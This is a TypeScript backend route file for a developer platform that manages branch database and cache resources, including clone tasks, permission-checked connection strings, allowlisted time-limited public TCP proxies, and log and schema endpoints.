      const completed = stateService.updateResourceCloneTask(taskId, {
        status: 'completed',
        progress: 100,
        progressMessage: 'MySQL 克隆完成，连接变量已注入分支 scope',
        finishedAt: new Date().toISOString(),
        injectedEnv: branchDb.maskedInjectedEnv,
        log: appendLog(`completed mysql clone into ${targetDatabase}`),
      });
      stateService.appendActivityLog(projectId, {
        type: 'resource-db-clone',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName,
        result: 'success',
        note: `${resourceName} clone-main 完成：${completed.progressMessage}`,
      });
      stateService.save();
    } catch (err) {
      const rootPassword = mysqlRootPassword(service);
      const message = maskTextSecrets((err as Error).message, [rootPassword]);
      const failed = stateService.updateResourceCloneTask(taskId, {
        status: 'failed',
        progress: 100,
        errorMessage: message,
        progressMessage: 'MySQL 克隆失败',
        finishedAt: new Date().toISOString(),
        log: maskTextSecrets(appendLog(`failed: ${message}`), [rootPassword]),
      });
      stateService.appendActivityLog(projectId, {
        type: 'resource-db-clone',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName,
        result: 'failed',
        note: `${resourceName} clone-main 失败：${failed.errorMessage || message}`,
      });
      stateService.save();
    }
  }

  async function getBranchResourceSnapshot(branch: BranchEntry) {
    const projectId = branch.projectId || 'default';
    const previewHost = resourcePublicHost();
    const preview = branch.branch
      ? buildPreviewUrlForProject(previewHost, branch.branch, stateService.getProject(projectId), projectId)
      : undefined;
    const previewUrl = preview?.url || '';
    return buildUnifiedBranchResources({
      branch,
      profiles: stateService.getEffectiveProfilesForBranch(branch),
      infraServices: stateService.getInfraServicesForProject(projectId),
      externalAccessPolicies: await getActiveResourceExternalAccessForBranch(projectId, branch),
      cloneTasks: stateService.listResourceCloneTasks({ projectId, branchId: branch.id }),
      branchEnv: stateService.getCustomEnvScope(branch.id),
      previewUrl,
      publicHost: previewHost,
    });
  }

  function resourceContainerName(resource: UnifiedBranchResource): string {
    const raw = resource.raw as { containerName?: string } | undefined;
    return String(resource.containerName || raw?.containerName || '').trim();
  }

  async function resolveResourceForRequest(req: Request, res: Response): Promise<{
    branch: BranchEntry;
    projectId: string;
    resourceId: string;
    resource: UnifiedBranchResource;
    containerName: string;
  } | null> {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return null;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return null; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return null;
    }
    return {
      branch,
      projectId,
      resourceId,
      resource,
      containerName: resourceContainerName(resource),
    };
  }

  function externalRuntimeConnectionString(
    resource: UnifiedBranchResource,
    service: InfraService,
    host: string,
    port: number,
    branch: BranchEntry,
  ): string {
    const runtime = resourceRuntimeKey(resource.runtime);
    const env = resolvedInfraEnv(service, branch);
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    if (runtime === 'mysql') {
      const db = branchEnv.MYSQL_DATABASE || env.MYSQL_DATABASE || env.MARIADB_DATABASE || resolvedServiceDbName(service) || 'app';
      const user = branchEnv.MYSQL_USER || env.MYSQL_USER || env.MARIADB_USER || 'user';
      return `mysql://${user}:******@${host}:${port}/${db}`;
    }
    if (runtime === 'postgres') {
      const db = branchEnv.POSTGRES_DB || env.POSTGRES_DB || resolvedServiceDbName(service) || 'postgres';
      const user = branchEnv.POSTGRES_USER || env.POSTGRES_USER || 'postgres';
      return `postgres://${user}:******@${host}:${port}/${db}`;
    }
    if (runtime === 'mongodb') {
      const db = branchEnv.MONGODB_DATABASE || branchEnv.MONGO_INITDB_DATABASE || env.MONGO_INITDB_DATABASE || resolvedServiceDbName(service) || 'app';
      const branchUser = branchEnv.MONGODB_USERNAME || branchEnv.MONGO_USERNAME || '';
      const user = branchEnv.MONGO_INITDB_ROOT_USERNAME
        || branchUser
        || env.MONGO_INITDB_ROOT_USERNAME
        || env.MONGO_USERNAME
        || env.MONGODB_USERNAME
        || 'user';
      const authSource = branchEnv.MONGODB_AUTH_SOURCE || branchEnv.MONGO_AUTH_SOURCE || (branchUser ? db : 'admin');
      return `mongodb://${user}:******@${host}:${port}/${db}?authSource=${authSource}`;
    }
    if (runtime === 'redis') return `redis://:******@${host}:${port}`;
    return `${host}:${port}`;
  }

  function usableRuntimeConnectionString(
    resource: UnifiedBranchResource,
    service: InfraService,
    branch: BranchEntry,
    host: string,
    port: number,
  ): string {
    const runtime = resourceRuntimeKey(resource.runtime);
    const env = resolvedInfraEnv(service, branch);
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    if (runtime === 'mysql') {
      const database = branchEnv.MYSQL_DATABASE || env.MYSQL_DATABASE || resolvedServiceDbName(service) || 'app';
      const user = branchEnv.MYSQL_USER || env.MYSQL_USER || 'root';
      const password = branchEnv.MYSQL_PASSWORD || env.MYSQL_PASSWORD || env.MYSQL_ROOT_PASSWORD || '';
      return `mysql://${encodeURIComponent(user)}:${encodeURIComponent(password)}@${host}:${port}/${encodeURIComponent(database)}`;
    }
    if (runtime === 'postgres') {
      const database = branchEnv.POSTGRES_DB || env.POSTGRES_DB || resolvedServiceDbName(service) || env.POSTGRES_USER || 'postgres';
      const user = branchEnv.POSTGRES_USER || env.POSTGRES_USER || 'postgres';
      const password = branchEnv.POSTGRES_PASSWORD || env.POSTGRES_PASSWORD || '';
      return `postgresql://${encodeURIComponent(user)}:${encodeURIComponent(password)}@${host}:${port}/${encodeURIComponent(database)}`;
    }
    if (runtime === 'mongodb') {
      const database = branchEnv.MONGODB_DATABASE || branchEnv.MONGO_INITDB_DATABASE || env.MONGO_INITDB_DATABASE || resolvedServiceDbName(service) || 'app';
      const branchUser = branchEnv.MONGODB_USERNAME || branchEnv.MONGO_USERNAME || '';
      const serviceUser = branchEnv.MONGO_INITDB_ROOT_USERNAME || env.MONGO_INITDB_ROOT_USERNAME || env.MONGO_USERNAME || env.MONGODB_USERNAME || '';
      const user = branchUser || serviceUser;
      const branchPassword = branchEnv.MONGODB_PASSWORD || branchEnv.MONGO_PASSWORD || '';
      const servicePassword = branchEnv.MONGO_INITDB_ROOT_PASSWORD || env.MONGO_INITDB_ROOT_PASSWORD || env.MONGO_PASSWORD || env.MONGODB_PASSWORD || '';
      const password = branchPassword || servicePassword;
      const auth = user ? `${encodeURIComponent(user)}:${encodeURIComponent(password)}@` : '';
      const authSourceDb = user
        ? (branchEnv.MONGODB_AUTH_SOURCE || branchEnv.MONGO_AUTH_SOURCE || (branchUser ? database : 'admin'))
        : '';
      const authSource = authSourceDb ? `?authSource=${encodeURIComponent(authSourceDb)}` : '';
      return `mongodb://${auth}${host}:${port}/${encodeURIComponent(database)}${authSource}`;
    }
    if (runtime === 'redis') {
      const password = branchEnv.REDIS_PASSWORD || env.REDIS_PASSWORD || env.REDIS_PASS || env.REDISCLI_AUTH || '';
      return password ? `redis://:${encodeURIComponent(password)}@${host}:${port}` : `redis://${host}:${port}`;
    }
    return `${host}:${port}`;
  }

  async function disableTcpResourceExternalAccess(policy?: ResourceExternalAccessPolicy | null): Promise<void> {
    if (!policy) return;
    const proxyContainerName = policy.proxyContainerName;
    if (proxyContainerName && /^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$/.test(proxyContainerName)) {
      await shell.exec(`docker rm -f ${routeShellQuote(proxyContainerName)} 2>/dev/null || true`, { timeout: 15_000 });
    }
    if (policy.firewallChain) {
      await cleanupResourceExternalFirewall(shell, policy.firewallChain, policy.port);
    }
  }

  function isResourceExternalAccessExpired(policy?: ResourceExternalAccessPolicy | null, now = Date.now()): boolean {
    if (!policy?.enabled || !policy.expiresAt) return false;
    const expiresAt = Date.parse(policy.expiresAt);
    return Number.isFinite(expiresAt) && expiresAt <= now;
  }

  async function expireResourceExternalAccessIfNeeded(
    projectId: string,
    branch: BranchEntry,
    resourceId: string,
    policy?: ResourceExternalAccessPolicy,
  ): Promise<ResourceExternalAccessPolicy | undefined> {
    if (!policy || !isResourceExternalAccessExpired(policy)) return policy;
    await disableTcpResourceExternalAccess(policy).catch(() => undefined);
    const expired = stateService.upsertResourceExternalAccess({
      projectId,
      branchId: branch.id,
      resourceId,
      enabled: false,
      kind: policy.kind,
      address: policy.address,
      host: policy.host,
      port: policy.port,
      connectionString: policy.connectionString,
      proxyContainerName: undefined,
      targetHost: undefined,
      targetPort: undefined,
      allowlistEnforced: false,
      firewallChain: undefined,
      allowlist: policy.allowlist || [],
      expiresAt: policy.expiresAt,
      updatedBy: 'system:ttl-expired',
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-external-access',
      branchId: branch.id,
      branchName: branch.branch,
      actor: 'system:ttl-expired',
      resourceId,
      result: 'success',
      note: `资源外部访问已在 ${policy.expiresAt} 到期并自动关闭`,
    });
    stateService.save();
    return expired;
  }

  async function getActiveResourceExternalAccessForBranch(projectId: string, branch: BranchEntry): Promise<ResourceExternalAccessPolicy[]> {
    const policies = stateService.getResourceExternalAccessForBranch(projectId, branch.id);
    for (const policy of policies) {
      await expireResourceExternalAccessIfNeeded(projectId, branch, policy.resourceId, policy);
    }
    return stateService.getResourceExternalAccessForBranch(projectId, branch.id);
  }

  let resourceExternalAccessSweepRunning = false;
  async function sweepExpiredResourceExternalAccess(): Promise<void> {
    if (resourceExternalAccessSweepRunning) return;
    resourceExternalAccessSweepRunning = true;
    try {
      for (const branch of stateService.getAllBranches()) {
        const projectId = branch.projectId || 'default';
        const policies = stateService.getResourceExternalAccessForBranch(projectId, branch.id);
        for (const policy of policies) {
          await expireResourceExternalAccessIfNeeded(projectId, branch, policy.resourceId, policy);
        }
      }
    } finally {
      resourceExternalAccessSweepRunning = false;
    }
  }

  const resourceExternalAccessSweepMs = Number(process.env.CDS_RESOURCE_EXTERNAL_ACCESS_SWEEP_MS || 60_000);
  if (resourceExternalAccessSweepMs > 0 && process.env.NODE_ENV !== 'test') {
    const timer = setInterval(() => {
      void sweepExpiredResourceExternalAccess().catch((err) => {
        console.warn('[resource-external-access] expired policy sweep failed:', (err as Error).message);
      });
    }, resourceExternalAccessSweepMs);
    timer.unref?.();
  }

  async function enableTcpResourceExternalAccess(input: {
    branch: BranchEntry;
    projectId: string;
    resourceId: string;
    resource: UnifiedBranchResource;
    allowlist: string[];
    currentPolicy?: ResourceExternalAccessPolicy;
  }): Promise<{
    address: string;
    host: string;
    port: number;
    connectionString: string;
    proxyContainerName: string;
    targetHost: string;
    targetPort: number;
    allowlistEnforced: boolean;
    firewallChain?: string;
  }> {
    if (input.resource.source !== 'infra') {
      throw new Error('只有 infra TCP 资源需要资源级 TCP proxy');
    }
    const service = input.resource.raw as InfraService;
    const targetContainer = resourceContainerName(input.resource);
    if (!targetContainer) throw new Error(`资源 "${input.resource.displayName}" 没有关联目标容器`);
    if (!/^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$/.test(targetContainer)) {
      throw new Error(`目标容器名非法：${targetContainer}`);
    }
    const targetRunning = await containerService.isRunning(targetContainer).catch(() => false);
    if (!targetRunning) {
      throw new Error(`资源 "${input.resource.displayName}" 未运行，不能开启公网 TCP 访问`);
    }
    const targetPort = input.resource.containerPort || service.containerPort || input.resource.port;
    if (!targetPort || targetPort < 1 || targetPort > 65535) {
      throw new Error(`资源 "${input.resource.displayName}" 缺少可代理的容器端口`);
    }
    const host = resourcePublicHost();
    if (!host) throw new Error('CDS 未配置 previewDomain/rootDomains，无法生成公网 TCP host');
    if (input.allowlist.length === 0) {
      throw new Error('开启数据库/缓存公网 TCP 访问必须填写 IP allowlist，禁止空 allowlist 暴露到公网');
    }

    const proxyContainerName = resourceExternalProxyName(input.projectId, input.branch.id, input.resourceId);
    const firewallChain = resourceExternalFirewallChain(input.projectId, input.branch.id, input.resourceId);
    const network = stateService.getProject(input.projectId)?.dockerNetwork || config.dockerNetwork;
    const listenPort = 15432;
    const port = await allocateResourceExternalPort(shell, input.currentPolicy?.enabled ? input.currentPolicy.port : undefined);
    await disableTcpResourceExternalAccess(input.currentPolicy);
    await ensureDockerNetwork(shell, network);
    const firewall = await applyResourceExternalFirewall(shell, firewallChain, port, input.allowlist);

    const scriptB64 = Buffer.from(RESOURCE_TCP_PROXY_SCRIPT, 'utf8').toString('base64');
    const evalScript = "eval(Buffer.from(process.env.CDS_PROXY_SCRIPT_B64,'base64').toString('utf8'))";
    const labels = [
      'cds.managed=true',
      'cds.type=resource-external-access',
      `cds.project.id=${input.projectId}`,
      `cds.branch.id=${input.branch.id}`,
      `cds.resource.id=${input.resourceId}`,
      `cds.target.container=${targetContainer}`,
    ];
    const cmd = [
      'docker run -d',
      `--name ${routeShellQuote(proxyContainerName)}`,
      `--network ${routeShellQuote(network)}`,
      `-p 0.0.0.0:${port}:${listenPort}`,
      ...labels.map((label) => `--label ${routeShellQuote(label)}`),
      `-e ${routeShellQuote(`TARGET_HOST=${targetContainer}`)}`,
      `-e ${routeShellQuote(`TARGET_PORT=${targetPort}`)}`,
      `-e ${routeShellQuote(`LISTEN_PORT=${listenPort}`)}`,
      `-e ${routeShellQuote(`ALLOWLIST=${input.allowlist.join(',')}`)}`,
      `-e ${routeShellQuote(`CDS_PROXY_SCRIPT_B64=${scriptB64}`)}`,
      '--restart unless-stopped',
      resourceTcpProxyImage(),
      'node',
      '-e',
      routeShellQuote(evalScript),
    ].join(' ');
    const run = await shell.exec(cmd, { timeout: 60_000 });
    if (run.exitCode !== 0) {
      await cleanupResourceExternalFirewall(shell, firewallChain, port);
      throw new Error(`启动资源公网 TCP proxy 失败：${combinedOutput(run).slice(0, 500)}`);
    }
    return {
      address: `tcp://${host}:${port}`,
      host,
      port,
      connectionString: externalRuntimeConnectionString(input.resource, service, host, port, input.branch),
      proxyContainerName,
      targetHost: targetContainer,
      targetPort,
      allowlistEnforced: firewall.enforced,
      ...(firewall.chain ? { firewallChain: firewall.chain } : {}),
    };
  }

  async function resolveSqlDataResourceForRequest(req: Request, res: Response): Promise<{
    branch: BranchEntry;
    projectId: string;
    resourceId: string;
    resourceName: string;
    runtime: SqlDataRuntime;
    service: InfraService;
  } | null> {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return null;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return null; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return null;
    }
    if (resource.source !== 'infra' || resource.kind !== 'database') {
      res.status(400).json({ error: '只有数据库资源支持数据面板' });
      return null;
    }
    const runtime = resourceRuntimeKey(resource.runtime);
    if (runtime !== 'mysql' && runtime !== 'postgres') {
      res.status(400).json({ error: `${resource.runtime} 数据面板执行器待接入` });
      return null;
    }
    return {
      branch,
      projectId,
      resourceId,
      resourceName: resource.displayName,
      runtime,
      service: resource.raw as InfraService,
    };
  }

  async function resolveRedisDataResourceForRequest(req: Request, res: Response): Promise<{
    branch: BranchEntry;
    projectId: string;
    resourceId: string;
    resourceName: string;
    service: InfraService;
  } | null> {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return null;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return null; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return null;
    }
    if (resource.source !== 'infra' || resourceRuntimeKey(resource.runtime) !== 'redis') {
      res.status(400).json({ error: '只有 Redis 资源支持 Redis 数据面板' });
      return null;
    }
    return {
      branch,
      projectId,
      resourceId,
      resourceName: resource.displayName,
      service: resource.raw as InfraService,
    };
  }

  async function resolveMongoDataResourceForRequest(req: Request, res: Response): Promise<{
    branch: BranchEntry;
    projectId: string;
    resourceId: string;
    resourceName: string;
    service: InfraService;
  } | null> {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return null;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return null; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return null;
    }
    if (resource.source !== 'infra' || resourceRuntimeKey(resource.runtime) !== 'mongodb') {
      res.status(400).json({ error: '只有 MongoDB 资源支持 MongoDB 数据面板' });
      return null;
    }
    return {
      branch,
      projectId,
      resourceId,
      resourceName: resource.displayName,
      service: resource.raw as InfraService,
    };
  }

  router.put('/branches/:id/resources/:resourceId/external-access', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }

    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    const enabled = Boolean(req.body?.enabled);
    let allowlist: string[];
    try {
      allowlist = normalizeIpv4Allowlist(req.body?.allowlist);
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    if (enabled && resource.source === 'infra' && allowlist.length === 0) {
      res.status(400).json({ error: '开启数据库/缓存公网 TCP 访问必须填写 IP allowlist，禁止空 allowlist 暴露到公网' });
      return;
    }
    const ttlMinutesRaw = Number(req.body?.ttlMinutes);
    const ttlMinutes = Number.isFinite(ttlMinutesRaw) && ttlMinutesRaw > 0
      ? Math.min(ttlMinutesRaw, 7 * 24 * 60)
      : null;
    const expiresAt = enabled && ttlMinutes
      ? new Date(Date.now() + ttlMinutes * 60_000).toISOString()
      : null;
    const externalAction: ResourcePermissionAction = enabled && (!ttlMinutes || ttlMinutes > 24 * 60)
      ? 'external-policy-admin'
      : 'external-temporary-access';
    if (!requireResourcePermission(req, res, externalAction, branch, resource)) return;
    const previewHost = resourcePublicHost();
    const currentPolicy = stateService.getResourceExternalAccess(projectId, branch.id, resourceId);
    let runtime: Partial<ResourceExternalAccessPolicy> = {};
    if (resource.source === 'infra') {
      try {
        if (enabled) {
          runtime = await enableTcpResourceExternalAccess({
            branch,
            projectId,
            resourceId,
            resource,
            allowlist,
            currentPolicy,
          });
        } else {
          await disableTcpResourceExternalAccess(currentPolicy);
          runtime = {
            address: currentPolicy?.address || resource.externalAccess?.address,
            host: currentPolicy?.host || resource.externalAccess?.host || previewHost,
            port: currentPolicy?.port || resource.externalAccess?.port,
            connectionString: currentPolicy?.connectionString || resource.externalAccess?.connectionString,
            proxyContainerName: undefined,
            targetHost: undefined,
            targetPort: undefined,
            allowlistEnforced: false,
            firewallChain: undefined,
          };
        }
      } catch (err) {
        res.status(500).json({ error: (err as Error).message });
        return;
      }
    }
    const fallbackAddress = resource.source === 'app'
      ? resource.externalUrl || resource.externalAccess?.address || ''
      : runtime.address || resource.externalAccess?.address || (previewHost && runtime.port ? `tcp://${previewHost}:${runtime.port}` : '');
    if (enabled && !fallbackAddress) {
      res.status(409).json({ error: `资源 "${resource.displayName}" 没有可用的外部地址或端口` });
      return;
    }
    const actor = resolveActorFromRequest(req);
    const policy = stateService.upsertResourceExternalAccess({
      projectId,
      branchId: branch.id,
      resourceId,
      enabled,
      kind: resource.source === 'app' ? 'https' : 'tcp',
      address: enabled ? fallbackAddress : resource.externalAccess?.address || fallbackAddress || undefined,
      host: runtime.host || previewHost || resource.externalAccess?.host,
      port: runtime.port || resource.externalAccess?.port || resource.port,
      connectionString: runtime.connectionString || resource.externalAccess?.connectionString,
      proxyContainerName: enabled ? runtime.proxyContainerName || resource.externalAccess?.proxyContainerName : undefined,
      targetHost: enabled ? runtime.targetHost || resource.externalAccess?.targetHost : undefined,
      targetPort: enabled ? runtime.targetPort || resource.externalAccess?.targetPort : undefined,
      allowlistEnforced: Boolean(runtime.allowlistEnforced),
      firewallChain: enabled ? runtime.firewallChain || resource.externalAccess?.firewallChain : undefined,
      allowlist,
      expiresAt,
      updatedBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-external-access',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName: resource.displayName,
      result: 'success',
      note: `${enabled ? '开启' : '关闭'} ${resource.displayName} 外部访问${expiresAt ? `，有效期至 ${expiresAt}` : ''}`,
    });
    stateService.save();
    const nextResources = await getBranchResourceSnapshot(branch);
    res.json({ policy, resource: nextResources.find((item) => item.id === resourceId) || null });
  });

  router.get('/branches/:id/resources/:resourceId/connection-string', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (resource.source !== 'infra') {
      res.status(400).json({ error: '只有 infra 资源支持生成数据库/缓存连接串' });
      return;
    }
    if (!requireSecretRevealAccess(req, res, projectId)) return;
    if (!requireResourcePermission(req, res, 'connection-inject', branch, resource)) return;
    const service = resource.raw as InfraService;
    const scope = String(req.query.scope || 'internal') === 'external' ? 'external' : 'internal';
    const policy = await expireResourceExternalAccessIfNeeded(
      projectId,
      branch,
      resourceId,
      stateService.getResourceExternalAccess(projectId, branch.id, resourceId),
    );
    let host = service.id;
    let port = service.containerPort || resource.containerPort || resource.port;
    if (scope === 'external') {
      if (!policy?.enabled || !policy.host || !policy.port) {
        res.status(409).json({ error: '资源尚未开启公网访问，无法生成外部连接串' });
        return;
      }
      host = policy.host;
      port = policy.port;
    }
    if (!host || !port) {
      res.status(409).json({ error: `资源 "${resource.displayName}" 缺少可用 host/port` });
      return;
    }
    const connectionString = usableRuntimeConnectionString(resource, service, branch, host, port);
    const maskedConnectionString = maskConnectionString(connectionString);
    stateService.appendActivityLog(projectId, {
      type: 'resource-connection-inject',
      branchId: branch.id,
      branchName: branch.branch,
      actor: resolveActorFromRequest(req),
      resourceId,
      resourceName: resource.displayName,
      result: 'success',
      note: `${resource.displayName} 复制${scope === 'external' ? '外部' : '内部'}连接串`,
    });
    stateService.save();
    res.json({
      branchId: branch.id,
      resourceId,
      scope,
      connectionString,
      maskedConnectionString,
      expiresAt: scope === 'external' ? policy?.expiresAt || null : null,
    });
  });

  router.get('/branches/:id/resources/:resourceId/audit', (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const limitRaw = Number(req.query.limit);
    const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(limitRaw, 1), 200) : 100;
    const logs = stateService.getActivityLogs(projectId)
      .filter((entry) => entry.branchId === branch.id && entry.resourceId === resourceId)
      .slice(0, limit);
    res.json({ branchId: branch.id, resourceId, logs, total: logs.length });
  });

  router.get('/branches/:id/resources/:resourceId/permissions', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    const permissions = buildResourcePermissionSummary(req, branch, resource);
    res.json({ branchId: branch.id, resourceId, ...permissions });
  });

  router.get('/branches/:id/resources/:resourceId/metrics', async (req, res) => {
    const ctx = await resolveResourceForRequest(req, res);
    if (!ctx) return;
    try {
      const statsMap = ctx.containerName && ctx.resource.status === 'running'
        ? await containerService.getServiceStats([ctx.containerName])
        : new Map();
      res.json({
        branchId: ctx.branch.id,
        projectId: ctx.projectId,
        resourceId: ctx.resourceId,
        resourceName: ctx.resource.displayName,
        containerName: ctx.containerName || null,
        status: ctx.resource.status,
        ts: Date.now(),
        stats: ctx.containerName && ctx.resource.status === 'running'
          ? (statsMap.get(ctx.containerName) || null)
          : null,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/logs', async (req, res) => {
    const ctx = await resolveResourceForRequest(req, res);
    if (!ctx) return;
    if (!ctx.containerName) {
      res.status(409).json({ error: `资源 "${ctx.resource.displayName}" 没有关联容器，无法读取日志` });
      return;
    }
    const tailRaw = Number(req.query.tail);
    const tail = Number.isFinite(tailRaw) ? Math.min(Math.max(Math.floor(tailRaw), 20), 1000) : 200;
    try {
      const logs = await containerService.getLogs(ctx.containerName, tail);
      const mask = shouldMask(req);
      const maskedLogs = maskSecretsText(logs, { mask });
      res.json({
        branchId: ctx.branch.id,
        projectId: ctx.projectId,
        resourceId: ctx.resourceId,
        resourceName: ctx.resource.displayName,
        containerName: ctx.containerName,
        status: ctx.resource.status,
        tail,
        masked: mask,
        logs: maskedLogs,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/tables', async (req, res) => {
    const ctx = await resolveSqlDataResourceForRequest(req, res);
    if (!ctx) return;
    try {
      const database = sqlDataDatabase(ctx.runtime, ctx.service, ctx.branch);
      const sql = ctx.runtime === 'postgres'
        ? "SELECT table_schema, table_name, table_type FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema') ORDER BY table_schema, table_name"
        : 'SHOW FULL TABLES';
      const result = await runSqlDataQuery(ctx.runtime, ctx.service, ctx.branch, sql);
      const tables = result.rows.map((row) => {
        if (ctx.runtime === 'postgres') {
          const schema = row[0] || 'public';
          const name = row[1] || '';
          return {
            schema,
            name,
            fullName: `${schema}.${name}`,
            type: row[2] || 'BASE TABLE',
          };
        }
        return {
          schema: database,
          name: row[0] || '',
          fullName: row[0] || '',
          type: row[1] || 'BASE TABLE',
        };
      }).filter((row) => row.name);
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, runtime: ctx.runtime, database, tables });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/workbench-capability', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    const capability = resourceWorkbenchCapability(resource.runtime);
    res.json({
      branchId: branch.id,
      resourceId,
      resourceName: resource.displayName,
      source: resource.source,
      kind: resource.kind,
      runtime: resource.runtime,
      capability,
    });
  });

  router.get('/branches/:id/resources/:resourceId/data/schema', async (req, res) => {
    const ctx = await resolveSqlDataResourceForRequest(req, res);
    if (!ctx) return;
    let ref: SqlTableRef;
    try {
      ref = sqlTableRefFromRequest(req.query.table, req.query.schema);
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    try {
      const database = sqlDataDatabase(ctx.runtime, ctx.service, ctx.branch);
      const sql = ctx.runtime === 'postgres'
        ? [
          'SELECT column_name, data_type, is_nullable,',
          "CASE WHEN EXISTS (SELECT 1 FROM information_schema.key_column_usage k WHERE k.table_schema = 'public' AND k.table_name = c.table_name AND k.column_name = c.column_name) THEN 'KEY' ELSE '' END AS column_key,",
          'column_default,',
          "CASE WHEN column_default LIKE 'nextval%' THEN 'auto_increment' ELSE '' END AS extra",
          'FROM information_schema.columns c',
          `WHERE table_schema = ${pgString(ref.schema || 'public')} AND table_name = ${pgString(ref.table)}`,
          'ORDER BY ordinal_position',
        ].join(' ')
        : [
          'SELECT COLUMN_NAME, COLUMN_TYPE, IS_NULLABLE, COLUMN_KEY, COLUMN_DEFAULT, EXTRA',
          'FROM information_schema.COLUMNS',
          `WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ${sqlString(ref.table)}`,
          'ORDER BY ORDINAL_POSITION',
        ].join(' ');
      const result = await runSqlDataQuery(ctx.runtime, ctx.service, ctx.branch, sql);
      const columns = result.rows.map((row) => ({
        name: row[0] || '',
        type: row[1] || '',
        nullable: row[2] || '',
        key: row[3] || '',
        defaultValue: row[4] || '',
        extra: row[5] || '',
      }));
